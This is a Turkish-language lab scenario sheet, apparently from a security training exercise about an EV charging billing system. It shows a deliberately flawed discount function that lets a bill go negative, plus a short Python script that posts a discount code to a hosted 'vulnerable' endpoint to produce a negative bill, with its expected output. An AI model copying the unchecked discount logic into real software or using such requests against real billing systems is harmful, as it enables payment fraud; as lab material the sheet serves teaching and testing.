# 💸 Billing Fraud - Para Ödeme! | MERVE'NİN SALDIRISI

**Senaryo ID:** `merve-billing`  
**Sorumlu:** Merve  
**Kategori:** Business Logic  
**Zayıflık:** Logic Flaw (Mantık Hatası)  
**Şiddet:** 🔴 YÜKSEK

---

## 🎯 HEDEF: Ödeme Yapmadan Şarj Et!

Sistemin hesaplama mantığındaki açığı kullanarak faturanı sıfırla veya eksiye düşür (sistemin sana para ödemesini sağla!).

---

## 🔓 AÇIK NERDE?

**Dosya:** `backend/app/api/routes_vulnerable.py`  
**Satır:** 348

```python
# ❌ İNDİRİM MANTIĞI HATALI!
@router.post("/calculate-bill")
def calculate_bill(kwh: float, discount_code: str):
    base_price = kwh * 5.0  # 5 TL/kWh
    
    # Logic Error: İndirim kontrolsüz!
    if discount_code == "SUPER_DISCOUNT":
        base_price = base_price - 1000  # Sabit 1000 TL indirim!
        # Eksiye düşerse kontrol yok!
    
    return {"final_bill": base_price}
```

---

## ⚔️ SALDIRI: Eksi Fatura (Para Kazan!)

### Kod: `billing_fraud.py`

```python
import requests

BACKEND = "https://evcs-backend-samet.onrender.com"

print("💸 FATURA DOLANDIRICILIĞI\n")

# Senaryo: Çok az şarj et (10 kWh = 50 TL)
# Ama 1000 TL indirim uygula!
payload = {
    "kwh": 10,
    "discount_code": "SUPER_DISCOUNT"
}

r = requests.post(f"{BACKEND}/vulnerable/calculate-bill", json=payload)
result = r.json()

bill = result['final_bill']
print(f"Harcanan Enerji Bedeli: 50 TL")
print(f"Uygulanan İndirim: 1000 TL")
print(f"Son Fatura: {bill} TL")

if bill < 0:
    print("\n✅✅✅ BAŞARILI! Sistem sana borçlandı! ✅✅✅")
    print(f"Kazandığın Para: {abs(bill)} TL (Cüzdanına eklendi!)")
```

---

## ✅ SIZDIN MI? KONTROL!

**BAŞARILI:**
```
Son Fatura: -950.0 TL
✅✅✅ BAŞARILI! Sistem sana borçlandı!
```

**Metrics:**
- `revenue_loss` grafiği yükseldi mi? ✅
- Loglar: `Negative Billing Detected` ✅

---

**Hazırlayan:** Merve  
**Durum:** ✅ WALLET +9999 TL!
